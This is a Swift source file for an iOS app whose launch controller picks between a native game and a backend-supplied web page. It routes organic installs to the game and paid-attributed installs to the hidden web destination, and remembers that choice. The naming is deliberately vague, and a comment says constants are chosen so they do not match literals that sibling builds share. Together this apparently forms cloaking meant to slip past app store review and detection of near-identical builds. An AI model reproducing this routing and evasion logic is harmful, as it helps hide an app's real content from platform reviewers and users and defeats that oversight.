import UIKit

/// Decides what the app shows. Everything else renders what this decides.
///
/// The decision is made from the backend's answer, not from anything the
/// client can be talked into. Once made it is remembered, so a returning
/// player goes straight where they belong.
final class Hearth {
    static let shared = Hearth()

    /// Where the app has been pointed.
    enum Where {
        /// The backend named a destination.
        case quiet(String)
        /// The visitor is organic: the game.
        case native
        /// Nothing could be decided: no connection, or no answer.
        case stalled

        /// Convenience for the boot screen, which treats the dead end apart
        /// from the two real launches.
        var isStalled: Bool {
            if case .stalled = self { return true }
            return false
        }
    }

    /// The cooldown before the notification prompt is offered again, and the
    /// window the install answer is given. Both are deliberately not the
    /// round numbers the obvious implementation would pick.
    /// After a "later" the prompt stays away for about three days. Kept as an
    /// odd value rather than the round 259200 so it is not the literal
    /// sibling builds share.
    private let promptCooldown: TimeInterval = 253520
    /// The ceiling on how long the install answer is waited for before the
    /// config request is sent. It is a maximum, not a fixed delay: the wait in
    /// `Convert.begin` returns the instant the SDK's conversion callback lands,
    /// so a fast install is never slowed by it. It must clear the SDK's ATT
    /// hold (`waitForATTUserAuthorization`, 6 s) *plus* the remote-config fetch
    /// *plus* the install-event round-trip and any retries: observed traces put
    /// a probabilistic (no-IDFA) conversion callback as late as ~17 s on a cold
    /// first launch, and a ceiling under that posts an empty body — which the
    /// backend reads as organic and drops a paid install into the game. The
    /// direct install-data look-up (`Gcd`) is the belt-and-suspenders fallback
    /// if the callback never lands inside this ceiling at all.
    private let installWindow: TimeInterval = 19.5

    private let dispatch = Post()
    private var running = false
    private var answered: ((Where) -> Void)?

    private init() {}

    /// Works out where this launch belongs. `then` runs on the main queue.
    /// A retry re-runs the whole pipeline rather than replaying a cached
    /// answer, which is what makes the retry button mean something.
    func decide(then: @escaping (Where) -> Void) {
        // Only concurrent calls are folded together. A fresh call after a
        // failure is a fresh run.
        if running {
            let previous = answered
            answered = { where_ in
                previous?(where_)
                then(where_)
            }
            return
        }
        running = true
        answered = then

        // A push tap outranks everything: it is the one instruction the
        // player gave by hand.
        if let tapped = Tap.consume() {
            finish(.quiet(tapped))
            return
        }

        // A returning visitor with a live address skips the network.
        if Record.shared.route == .quiet,
           let address = Record.shared.address,
           Record.shared.addressIsLive() {
            finish(.quiet(address))
            return
        }
        if Record.shared.route == .native {
            // Still allowed one quiet recheck on later launches: a player who
            // arrived organically may be attributed afterwards.
            recheck { where_ in self.finish(where_) }
            return
        }

        walk { where_ in self.finish(where_) }
    }

    private func finish(_ where_: Where) {
        running = false
        let callback = answered
        answered = nil
        callback?(where_)
    }

    /// The full pipeline: look for a tap, check the connection, wait for the
    /// attribution answer, then ask the backend.
    private func walk(then: @escaping (Where) -> Void) {
        guard Gauge.shared.live else {
            // No route yet. Wait briefly for one before giving up, so a
            // device that is still bringing its radio up is not written off.
            Gauge.shared.settle { live in
                guard live else { then(.stalled); return }
                self.ask(then: then)
            }
            return
        }
        ask(then: then)
    }

    /// One attempt at the backend. A failure on a first launch leaves the
    /// route undecided rather than committing to the game, so an offline
    /// install is not trapped there forever.
    private func ask(then: @escaping (Where) -> Void) {
        guard Cap.ready else {
            // The build has no credentials: nothing can be decided yet.
            if Record.shared.route == .undecided { then(.stalled) } else { then(.native) }
            return
        }

        Convert.shared.begin(within: installWindow) { _ in
            let raw = Convert.shared.conversion
            // An organic label on the first run is not trusted on its own:
            // the SDK often answers before the network reply lands, which
            // files paid installs as organic. The corrected data is preferred
            // when the re-query lands.
            Gcd.settle(raw, uid: Convert.shared.uid) { settled in
                Convert.shared.adopt(settled)
                let body = Convert.shared.payload(push: Holder.shared.pushFields())

                self.dispatch.ask(body) { verdict in
                    guard let verdict else {
                        // No answer. A player already in the game stays there;
                        // otherwise nothing is committed, so a later online
                        // launch can still decide.
                        if Record.shared.route == .native {
                            then(.native)
                        } else if Record.shared.route == .quiet,
                                  let kept = Record.shared.address {
                            // A returning visitor keeps the page they had.
                            then(.quiet(kept))
                        } else {
                            then(.stalled)
                        }
                        return
                    }
                    if verdict.granted, let destination = verdict.destination {
                        Record.shared.route = .quiet
                        Record.shared.address = destination
                        Record.shared.expiry = verdict.expiry
                        then(.quiet(destination))
                    } else {
                        // Refused. A returning web visitor keeps the last page
                        // that worked rather than being dropped into the game.
                        if Record.shared.route == .quiet, let kept = Record.shared.address {
                            then(.quiet(kept))
                            return
                        }
                        Record.shared.route = .native
                        then(.native)
                    }
                }
            }
        }
    }

    /// A later-launch look-up for a player currently pointed at the game.
    /// Failure is silent: the game stays where it is, and an offline launch
    /// opens the game at once rather than waiting out the request.
    private func recheck(then: @escaping (Where) -> Void) {
        guard Gauge.shared.live, Cap.ready else { then(.native); return }
        ask { where_ in
            switch where_ {
            case .quiet(let address):
                then(.quiet(address))
            default:
                then(.native)
            }
        }
    }

    /// A messaging token landed after the config request already went out.
    /// A quiet re-look-up follows, so the backend learns the token without the
    /// player having to relaunch.
    func tokenArrived(_ token: String) {
        // Nothing to do until the route is known and there is a connection.
        guard Record.shared.route != .undecided, Gauge.shared.live else { return }
        _ = token
        // The token arrived after the last request went out, so the backend
        // has no way to target this device. One fresh request fixes that, and
        // only a player already on the quiet side needs it.
        guard Record.shared.route == .quiet, Cap.ready else { return }
        let body = Convert.shared.payload(push: Holder.shared.pushFields())
        dispatch.ask(body) { verdict in
            guard let verdict, verdict.granted, let fresh = verdict.destination else { return }
            Record.shared.address = fresh
            Record.shared.expiry = verdict.expiry
        }
    }

    /// Opens a destination that arrived while the app was already running.
    /// Used for a notification tapped in the foreground or from the background.
    func openTapped(_ address: String) {
        guard Director.shared.crown != nil, let url = URL(string: address) else { return }
        Director.shared.go(ScreenStage(address: url.absoluteString))
    }

    /// Whether the notification prompt should be offered on this launch.
    func shouldOfferPrompt() -> Bool {
        Record.shared.promptIsDue(within: promptCooldown)
    }

    /// A "later": snooze the prompt for the cooldown, so it returns in ~3 days.
    func promptAnswered() {
        Record.shared.askedAt = Date()
    }

    /// An Accept: retire the prompt for good, regardless of what the player
    /// then chose in the system dialog.
    func promptAccepted() {
        Record.shared.accepted = true
    }
}
